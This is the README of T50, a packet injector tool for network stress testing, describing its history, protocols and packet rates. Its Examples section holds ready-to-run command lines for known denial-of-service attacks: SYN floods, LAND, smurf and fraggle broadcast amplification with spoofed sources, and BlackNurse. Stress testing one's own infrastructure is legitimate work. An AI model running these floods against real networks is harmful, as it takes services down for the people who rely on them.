```
/***************************************************************************
 * Talk:        The Hangover - A "modern" (?) high performance approach to
 *              build an offensive computing tool!
 * Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
 * Conference:  Hackers to Hackers Conference Seventh Edition (November 2010)
 ***************************************************************************
  ___________._______________
  \__    ___/|   ____/\   _  \   T50: an Experimental Packet Injector Tool
    |    |   |____  \ /  /_\  \                 Release 5.3
    |    |   /       \\  \_/   \
    |____|  /______  / \_____  /   Copyright (c) 2001-2011 Nelson Brito
                   \/        \/             All Rights Reserved

 ***************************************************************************/
 ```
# T50: an Experimental Packet Injector Tool
**T50** is an Experimental Mixed Packet Injector (based on private tools: [```b52```](https://github.com/nbrito/source/tree/master/c/b52), [```f117```](https://github.com/nbrito/source/tree/master/c/f117) and [```f22```](https://github.com/nbrito/source/tree/master/c/f22)), and a tool designed to perform [stress testing](https://en.wikipedia.org/wiki/Stress_testing_(software)). Its concept started in 2001, right after  [```nb-isakmp.c```](https://github.com/nbrito/research/blob/master/cve/CVE-2001-0951/nb-isakmp.c) release, which the main goal would be:
* Having a tool to perform TCP/IP protocol [fuzzer](https://en.wikipedia.org/wiki/Fuzzing) (see ["Examples"](https://github.com/nbrito/source/tree/master/c/t50#examples) for further information), covering common regular protocols, such as: [ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol), [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) and [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol).

Things have changed, and the **T50** became a good unique resource capable to perform [stress testing](https://en.wikipedia.org/wiki/Stress_testing_(software)). Some protocols were chosen to be part of its [very first release](https://github.com/nbrito/source/tree/master/c/t50/2.45r) coverage:
* [ICMP (Internet Control Message Protocol)](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol)
* [IGMP (Internet Group Management Protocol)](https://en.wikipedia.org/wiki/Internet_Group_Management_Protocol)
* [TCP (Transmission Control Protocol)](https://en.wikipedia.org/wiki/Transmission_Control_Protocol))
* [UDP (User Datagram Protocol)](https://en.wikipedia.org/wiki/User_Datagram_Protocol)

## History
**T50** was first released at [Hackers to Hackers Conference Seventh Edition](https://www.h2hc.com.br/), [November 2010](https://github.com/nbrito/source/tree/master/c/t50#november-2010), and, less than five months later, was updated and released at Web Security Forum, [April 2011](https://github.com/nbrito/source/tree/master/c/t50#april-2011). The significant 2011 update introduced ten protocols and redesigned the packet build process, which are still the same since then.

Through the years, **T50** has been widely used by companies validating their infrastructures (running **T50** by themselves or buying/contracting a third-party tool/consultancy that incorporates the **T50**), and, due to its [power and unique](https://github.com/nbrito/source/tree/master/c/t50#a-powerful-and-unique-tool) approach, **T50** has been incroporated by:
* [ArchAssault](https://archassault.org/packages/archassault/x86_64/t50/)
* [**BackTrack**](http://www.backtrack-linux.org/forums/showthread.php?t=40252)
* [BlackArch](http://www.blackarch.org/tools.html)
* [Debian](https://packages.debian.org/sid/utils/t50)
* [Kali](http://tools.kali.org/stress-testing/t50)
* [Ubuntu](https://packages.ubuntu.com/artful/t50)

Also, proving **T50** [power and unique](https://github.com/nbrito/source/tree/master/c/t50#a-powerful-and-unique-tool) approach, it has been used as a tool to support academic papers and studies:
* [Paper 01](http://www.fatecbauru.edu.br/ojs/index.php/CET/article/download/53/49)
* [Paper 02](http://www.fateclins.edu.br/site/trabalhoGraduacao/7FQZs5t7Bb5kV8ssc2IR1GWUXM6Uw46ynNFVy8dVNTY20vB.pdf)
* [Paper 03](http://www.repositoriobib.ufc.br/000013/0000137a.pdf)
* [Paper 04](http://www.teses.usp.br/teses/disponiveis/3/3141/tde-18032015-155642/publico/DISSERTACAO_JOAO_PAULO_ARAGAO_PEREIRA.pdf)
* [Paper 05](http://painel.passofundo.ifsul.edu.br/uploads/arq/20160331191141344853464.pdf)
* [Paper 06](http://www.fatecbauru.edu.br/ojs/index.php/CET/article/download/197/164)
* [Paper 07](http://www.monografias.ufop.br/bitstream/35400000/253/1/MONOGRAFIA_TestesSegurançaSDN%27s.pdf)
* [Paper 08](http://www.fateclins.edu.br/site/trabalhoGraduacao/fH8dnMpZlbbf6qdmmozdM7CH2jvO2KB4hIn8zC4sPjcsL9W.pdf)
* [Paper 09](http://repositorio.ufla.br/bitstream/1/12161/1/DISSERTAÇÃO_Sistema%20de%20detecção%20de%20intrusão%20em%20redes%20de%20computadores%20com%20técnicas%20de%20inteligência%20computacional.pdf)
* [Paper 10](http://seer.upf.br/index.php/rbca/article/viewFile/6595/4190)

Last, but not least, **T50** has been mentioned by some security vendors, security consulting and security training:
* [Fortinet](http://www.isacapr.com/uploads/3/9/5/4/39543893/303_v2.pdf)
* [Radware](https://blog.radware.com/security/2016/06/2016-republican-national-convention-rnc-democratic-national-convention-dnc-will-be-cyber-attacked/)
* [Network Warrior Weekend Camp](https://nwwc.dk)
* [Simulated DDoS Attacks](https://ripe72.ripe.net/presentations/32-simulated-ddos-ripe.pdf)

### November 2010
* [Talk](https://github.com/nbrito/talks/tree/master/2010/h2hc)
* [Demo](https://www.youtube.com/watch?v=NwhccMB1cpI)
* [Source](https://github.com/nbrito/source/tree/master/c/t50/2.45r)
### April 2011
* [Talk](https://github.com/nbrito/talks/tree/master/2011/websecurityforum)
* [Demo](https://www.youtube.com/watch?v=e1KaL15Br4Y)
* [Video](https://www.youtube.com/watch?v=hT6y6FduIFY)
* [Source](https://github.com/nbrito/source/tree/master/c/t50/5.3)
* [Source](https://github.com/nbrito/source/tree/master/c/t50/5.3r1)

## Why [stress testing](https://en.wikipedia.org/wiki/Stress_testing_(software))?
Well, because when people are designing a new network infra-structure (eg. Datacenter serving to Cloud Computing) they think about:
* High-Availability
* Load Balancing
* Backup Sites (Cold Sites, Hot Sites, and Warm Sites)
* Disaster Recovery
* Data Redundancy
* Service Level Agreements
* Etc...

But almost nobody thinks about [stress testing](https://en.wikipedia.org/wiki/Stress_testing_(software)), or even performs any test to check how the networks infra-structure behaves under stress, under overload, and under attack. Even during a penetration-test, people prefer not running any kind of [Denial-of-Service](https://en.wikipedia.org/wiki/Denial-of-service_attack) testing. Even worse, those people are missing one of the three key concepts of security that are common to risk management:
* Confidentiality
* Integrity
* **Availability**

## Version [5.3](https://github.com/nbrito/source/tree/master/c/t50/5.3) and [5.3r1](https://github.com/nbrito/source/tree/master/c/t50/5.3)
**T50** was designed to perform [stress testing](https://en.wikipedia.org/wiki/Stress_testing_(software)) on a variety of infra-structure network devices ([2.45](https://github.com/nbrito/source/tree/master/c/t50/2.45r)), using widely implemented protocols, and after some requests it was was re-designed to extend the tests ([5.3](https://github.com/nbrito/source/tree/master/c/t50/5.3) and [5.3r1](https://github.com/nbrito/source/tree/master/c/t50/5.3)), covering some regular protocols ([ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol), [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) and [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol)), some infra-structure specific protocols ([GRE](https://en.wikipedia.org/wiki/Generic_Routing_Encapsulation), [IPSec](https://en.wikipedia.org/wiki/IPsec) and [RSVP](https://en.wikipedia.org/wiki/Resource_Reservation_Protocol)), and some routing protocols ([RIP](https://en.wikipedia.org/wiki/Routing_Information_Protocol), [EIGRP](https://en.wikipedia.org/wiki/Enhanced_Interior_Gateway_Routing_Protocol) and [OSPF](https://en.wikipedia.org/wiki/Open_Shortest_Path_First)).

This new version ([5.3](https://github.com/nbrito/source/tree/master/c/t50/5.3) and [5.3r1](https://github.com/nbrito/source/tree/master/c/t50/5.3)) is focused on internal infra-structure, which allows people to test the availability of its resources.

### Interior Gateway Protocols (Distance Vector Algorithm)
* [Routing Information Protocol](https://en.wikipedia.org/wiki/Routing_Information_Protocol)
* [Enhanced Interior Gateway Routing Protocol](https://en.wikipedia.org/wiki/Enhanced_Interior_Gateway_Routing_Protocol)

### Interior Gateway Protocols (Link State Algorithm)
* [Open Shortest Path First](https://en.wikipedia.org/wiki/Open_Shortest_Path_First)

### Quality-of-Service Protocols
* [Resource ReSerVation Protocol](https://en.wikipedia.org/wiki/Resource_Reservation_Protocol)

### Tunneling/Encapsulation Protocols
* [Generic Routing Encapsulation](https://en.wikipedia.org/wiki/Generic_Routing_Encapsulation)

## A Powerful and Unique Tool
**T50** is a powerful and unique packet injector tool, which is capable to:
1. Send sequentially the following fourteen (14) protocols: [ICMP](https://en.wikipedia.org/wiki/Internet_Control_Message_Protocol), [IGMPv1](https://en.wikipedia.org/wiki/Internet_Group_Management_Protocol), [IGMPv3](https://en.wikipedia.org/wiki/Internet_Group_Management_Protocol#IGMPv3_membership_query), [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol), [EGP](https://en.wikipedia.org/wiki/Exterior_Gateway_Protocol), [UDP](https://en.wikipedia.org/wiki/User_Datagram_Protocol), [RIPv1](https://en.wikipedia.org/wiki/Routing_Information_Protocol#RIP_version_1), [RIPv2](https://en.wikipedia.org/wiki/Routing_Information_Protocol#RIP_version_2), [DCCP](https://en.wikipedia.org/wiki/Datagram_Congestion_Control_Protocol), [RSVP](https://en.wikipedia.org/wiki/Resource_Reservation_Protocol), [GRE](https://en.wikipedia.org/wiki/Generic_Routing_Encapsulation), [IPSec](https://en.wikipedia.org/wiki/IPsec) ([AH](https://en.wikipedia.org/wiki/IPsec#Authentication_Header)/[ESP](https://en.wikipedia.org/wiki/IPsec#Encapsulating_Security_Payload)), [EIGRP](https://en.wikipedia.org/wiki/Enhanced_Interior_Gateway_Routing_Protocol), and [OSPF](https://en.wikipedia.org/wiki/Open_Shortest_Path_First).
2. **It is the only tool capable to encapsulate the protocols (listed above) within [Generic Routing Encapsulation (GRE)](https://en.wikipedia.org/wiki/Generic_Routing_Encapsulation).**
3. **It is the only tool capable to build [TCP](https://en.wikipedia.org/wiki/Transmission_Control_Protocol) packets with almost all the possible options: [TCP Maximum Segment Size](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Maximum_segment_size), [TCP Window Scale Option](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Window_scaling), [TCP Timestamps Option](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#TCP_timestamps), TCP Extensions for Transactions Functional Specification, [TCP Sack-Permitted Option](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Selective_acknowledgments), TCP MD5 Signature Option and TCP Authentication Option.**
4. Perform [stress testing](https://en.wikipedia.org/wiki/Stress_testing_(software)) on a variety of network infrastructure, network devices and security solutions in place.
5. Simulate [Distributed Denial-of-Service and Denial-of-Service](https://en.wikipedia.org/wiki/Denial-of-service_attack) attacks, validating Firewall rules, Router ACLs, Intrusion Detection System and Intrusion Prevention System policies.
* Some thoughts and recommendations of [Distributed Denial-of-Service and Denial-of-Service](https://en.wikipedia.org/wiki/Denial-of-service_attack) defenses have been shared through this [link](https://fnstenv.blogspot.com/2012/02/uso-irresponsavel-do-t50.html).
6. Send an (quite) incredible amount of packets per second, making it a _second to none_ tool:
* More than 120,000 pps of [SYN](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#CONNECTION-ESTABLISHMENT)  (+60% of the network uplink) in a [100BASE-TX](https://en.wikipedia.org/wiki/Fast_Ethernet#100BASE-TX) network ([Fast Ethernet](https://en.wikipedia.org/wiki/Fast_Ethernet)).
* More than 1,000,000 pps of [SYN](https://en.wikipedia.org/wiki/Transmission_Control_Protocol#CONNECTION-ESTABLISHMENT)  (+50% of the network uplink) in a [1000BASE-T](https://en.wikipedia.org/wiki/Gigabit_Ethernet#1000BASE-T) network ([Gigabit Ethernet](https://en.wikipedia.org/wiki/Gigabit_Ethernet)).

The main differentiator of the **T50** is that it is able to send all protocols, sequentially, using one single [RAW(7) SOCKET](https://en.wikipedia.org/wiki/Raw_socket), besides it can be capable to modify network routes.

For current release of **T50**, please, refer to this [link](https://github.com/fredericopissarra/t50).

## Examples
1.  [CVE-1999-0016](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0016):
* ```$ sudo ./t50 [target-address]  --dport [target-port] --saddr [target-address] --sport [target-port] --protocol TCP --syn --sequence 3868 --window 2048 --threshold 1```
2. [CVE-1999-0116](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0116):
* ```$ sudo ./t50 [target-address] --dport [target-port] --protocol TCP -S --flood```
3. [CVE-1999-0513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0513):
* ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --protocol ICMP --icmp-type 8 --icmp-code 0 --flood```
4. [CVE-1999-0514](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0514):
* ```$ sudo ./t50 [broadcast-address] --saddr [target-address] --sport [target-port] --protocol UDP --flood```
5. [CVE-2002-1712](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1712):
* ```$ sudo ./t50 [target-address]  --dport [target-port] --protocol TCP --ack --fin --window 16384 --flood```
6. [BlackNurse](http://blacknurse.dk):
* ```$ sudo ./t50 [target-address] --protocol ICMP --icmp-type 3 --icmp-code 3 --flood```

## Credits
[Nelson Brito](mailto:nbrito@sekure.org)

## Disclaimer
Codes are available for research purposes only, and I vehemently deny the malicious use, as well as the illegal purpose use, of any information, code and/or tool contained on this repository.

If you think there is any information, code and/or tool that should not be here, please, [let me know](mailto:nbrito@sekure.org).

## Warning
This repository does not provide you with any legal rights to any intellectual property in any information, code and/or tool, also, be aware that the use of some information, code and/or tool may be forbidden in some countries, and there may be rules and laws prohibiting any unauthorized user from use the information, code and/or tool, being these actions considered illegal.
